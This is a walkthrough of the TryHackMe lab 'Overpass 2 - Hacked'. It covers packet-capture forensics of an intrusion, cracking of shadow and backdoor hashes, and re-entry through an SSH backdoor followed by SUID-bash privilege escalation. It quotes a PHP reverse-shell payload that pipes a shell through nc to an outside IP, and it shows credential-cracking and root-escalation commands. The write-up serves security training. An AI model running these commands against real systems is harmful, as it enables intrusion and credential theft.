---
layout: default
title: Overpass 2 - Hacked | TryHackMe Walkthrough
date: 2024-09-01
categories: thm
tags: [wireshark, john, hashcat, ssh-backdoor, privilege-escalation, thm, ctf]
---

# Overpass 2 - Hacked: TryHackMe Walkthrough

- [Tools](#tools)
- [Forensics - Analyse the PCAP](#forensics---analyse-the-pcap)
- [Research - Analyse the code](#research---analyse-the-code)
- [Attack - Get back in!](#attack---get-back-in)

Room: [https://thm.com/room/overpass2hacked](https://thm.com/room/overpass2hacked)

## Tools 

- Wireshark https://www.wireshark.org/download.html
- Strings
- John The Ripper https://www.openwall.com/john/
- hashcat https://hashcat.net/hashcat/

##  Forensics - Analyse the PCAP

- Download `overpass2.pcapng`.
- Check and match `md5sum` of the file to verify file.

```bash
md5sum overpass2.pcapng 
11c3b2e9221865580295bc662c35c6dc  overpass2.pcapng
```

- We can use `wireshark` and `follow TCP streams` of suspicious streams. But, I used `strings overpass2.pcapng`.
- With strings we can see everything in plaintext. There is a request to link on directory `/development/upload.php`.
- Question `What was the URL of the page they used to upload a reverse shell?` Answer `/development/`.
- With same method we can get the payload `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`. You can check it by scrolling or simply use `strings overpass2.pcapng |grep "php exec"`
- Question `What payload did the attacker use to gain access?` Answer `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`.
- Question `What password did the attacker use to privesc?` Answer `whene************tant`. You can manually scan strings result to see the password.
- Question `How did the attacker establish persistence?` Answer `https://github.com/NinjaJc01/ssh-backdoor`. With same manual scrolling will work here.
- We can see `cat /etc/shadow` command and it's result inside `strings` output. We can simply save it in a file named shadow.
- Then we need to download `fasttrack` wordlist as instructed using command `wget https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt`.
- Then we can run john to check.

```bash
john --wordlist=fasttrack.txt shadow 
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
se*****y3        (paradox)
ab***23          (szymex)
s****t12         (bee)
1***2wsx         (muirland)
4g 0:00:00:04 100% 0.8113g/s 45.03p/s 187.4c/s 187.4C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

- Question `Using the fasttrack wordlist, how many of the system passwords were crackable?` Answer `4` 


## Research - Analyse the code

- We have the backdoor link `https://github.com/NinjaJc01/ssh-backdoor`. We can find `hash` and `salt` details inside code. `https://raw.githubusercontent.com/NinjaJc01/ssh-backdoor/master/main.go`
- Question `What's the default hash for the backdoor?` 
  Answer `bdd04d9bb7621687f5df9001f******2d7d8391dfc885d0e9b68acd01fc2170e3`
- Question `What's the hardcoded salt for the backdoor?`
  Answer `1c362db832f3f864c8c2fe05f2002a05`.
- Question `What was the hash that the attacker used? - go back to the PCAP for this!` 
  Answer `6d05358f090eea56a238af******19292cbfe0b5e98ad1fec71bed`. We can check it manually inside `strings` output. By using `strings overpass2.pcapng |grep "backdoor -a"` we can directly find the output.
- As we can find in the backdoor code that it is `sha512`. So we can decode it using `hashcat`.

```bash
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /opt/wordlist/rockyou.txt --quiet
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:no******6
```

- Question `Crack the hash using rockyou and a cracking tool of your choice. What's the password?` Answer `n********6`

## Attack - Get back in!

- Start Machine to get IP.
- Question `The attacker defaced the website. What message did they leave as a heading?` Answer `H4ck3d by CooctusClan`. Manually checking strings output for downloading deface page will show this. We can also use this command `strings overpass2.pcapng |grep "H4ck3d"`. Or simply opening the ip in browser will show this heading.
- We have repeat attackers steps. Now we can login to the ssh port 2222 opened by the backdoor as we saw in `strings` output. We already have username `james` and can use cracked password. We need to use `-oHostKeyAlgorithms=+ssh-rsa` to get ssh as there is an error.

```bash
ssh -p 2222 james@10.10.136.126
Unable to negotiate with 10.10.136.126 port 2222: no matching host key type found. Their offer: ssh-rsa
$ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.136.126 -p 2222
The authenticity of host '[10.10.136.126]:2222 ([10.10.136.126]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.136.126]:2222' (RSA) to the list of known hosts.
james@10.10.136.126's password: *******
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

- Question `What's the user flag?` Answer `thm{****************}`

```bash
james@overpass-production:/home/james/ssh-backdoor$ cat /home/james/user.txt
thm{****************}
```

- By using SUID find command `find . -perm /4000` we got a unusual file `/home/james/.suid_bash`. We can get suid exploit for it here https://gtfobins.github.io/gtfobins/bash/#suid
- Question `What's the root flag?` Answer `thm{***************************}`

```bash
james@overpass-production:/home/james/ssh-backdoor$ /home/james/.suid_bash -p
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# cat /root/root.txt 
thm{***************************}
```

